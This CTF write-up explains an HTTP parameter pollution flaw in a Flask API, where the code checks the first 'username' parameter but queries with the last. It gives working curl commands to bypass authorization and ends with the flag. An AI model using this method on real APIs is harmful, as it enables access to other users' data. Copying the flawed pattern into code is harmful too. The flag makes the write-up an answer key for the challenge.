# Writeup: API Parameter Pollution Challenge

## Category: API Security

## Challenge Name: Secure API

## URL: https://tlctf2025-api.chals.io

### 1. Challenge Overview

We are provided with a Python Flask API (app-public.py) and a link to a live instance. The goal is to recover a flag hidden within the /api/balance endpoint.

A review of the source code shows that the flag is strictly conditional: it is only returned if the user's balance is greater than or equal to 10,000.

Regular Users: Registered via the API with a starting balance of 100.

Admin User: Hardcoded in the database with a balance of 10,000.

Objective: We must trick the API into revealing the "admin" user's balance (and thus the flag) while authenticated as a low-privileged user.

### 2. Code Analysis

The vulnerability is located in the balance() function in app-public.py. The authentication flow is standard, but the logic for retrieving a user's balance contains a critical flaw in how it handles query parameters.

**The Vulnerable Logic**

```@app.route('/api/balance', methods=['GET'])
def balance():
    # 1. Access Control Check
    # request.args.get returns the FIRST value for 'username'
    target = request.args.get('username')
    
    # Verifies that the target matches the logged-in user
    if target and target != auth_user:
        return jsonify({'error': 'unauthorized'}), 403

    # 2. Database Query
    # request.args.getlist returns ALL values for 'username'
    query_target = request.args.getlist('username')
    
    if query_target:
        # The code explicitly selects the LAST value in the list
        actual_target = query_target[-1] 
        cur = db.execute('SELECT username, balance FROM users WHERE username = ?', (actual_target,))
```

The Vulnerability: HTTP Parameter Pollution (HPP)

The application validates one parameter but uses another for the actual logic:

Validation: request.args.get('username') fetches the first occurrence of the parameter. This is checked against our logged-in session.

Execution: request.args.getlist('username')[-1] fetches the last occurrence. This is used to query the database.

By sending two username parameters, we can pass the check with the first one and query the admin account with the second.

### 3. Exploitation Steps

**Step 1**: Register a User

First, we register a random user to get valid credentials.

_Command_:

``` curl -X POST -H "Content-Type: application/json" -d '{"username":"azrael", "password":"password"}' https://tlctf2025-api.chals.io/api/register```

###### _password doesnt matter as this is a ctf_

![alt text](api1.png)

**Step 2**: Login and Obtain Token

We log in with the created user to retrieve the UUID authentication token.

_Command_:

```curl -X POST -H "Content-Type: application/json" -d '{"username":"azrael", "password":"password"}' https://tlctf2025-api.chals.io/api/login```


![alt text](api2.png)

### Step 3: Exploit via Parameter Pollution

Using the token, we request the balance. We set the first username to "azrael" (to pass the auth check) and the second username to "admin" (to trigger the query for the flag).

_Command_:

```curl -H "Authorization: Bearer <YOUR_TOKEN>" https://tlctf2025-api.chals.io/api/balance?username=azrael&username=admin```

_Our command_:

```curl -H "Authorization: Bearer 09dd59fa-d916-45e6-89ca-d2ef4158bc2a" https://tlctf2025-api.chals.io/api/balance?username=azrael&username=admin```

![alt text](api3.png)

### **BOOM** Challenge Over 

### 4. Conclusion

The challenge demonstrated a Logic Flaw specifically known as HTTP Parameter Pollution (HPP). By exploiting the discrepancy between how the access control mechanism and the business logic processed duplicate parameters, we successfully bypassed authorization and accessed administrative data.

Flag: trustctf{1n53cur3_0bj3c7_r3f3r3nc3_f7w}
